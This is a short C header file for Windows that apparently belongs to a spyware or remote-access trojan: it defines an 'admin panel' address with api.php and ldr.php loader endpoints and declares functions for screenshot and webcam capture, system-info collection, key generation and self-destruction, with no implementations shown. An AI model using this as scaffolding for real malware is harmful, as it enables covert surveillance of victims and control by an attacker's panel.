#pragma once
#include <windows.h>

#define ADMIN_PANEL L"127.0.0.1"
#define API_URL L"/api.php"
#define LDR_URL "/ldr.php"

void randomInt(SIZE_T* out, int from, int to);
LPCWSTR resolveEnvrimoment(const WCHAR* env);
BOOL pathExists(LPCWSTR path, BOOL isFile);
LPCWSTR bitGetHostByName(LPCWSTR domain);
int captureScreenshot(LPCWSTR szFile);
void captureCam(WCHAR* szPath);
void CryptGenKey(BYTE** data);
LPCWSTR getSystemInfoW();
void selfDestruct();
LPCSTR genCountry();
CHAR* randKey();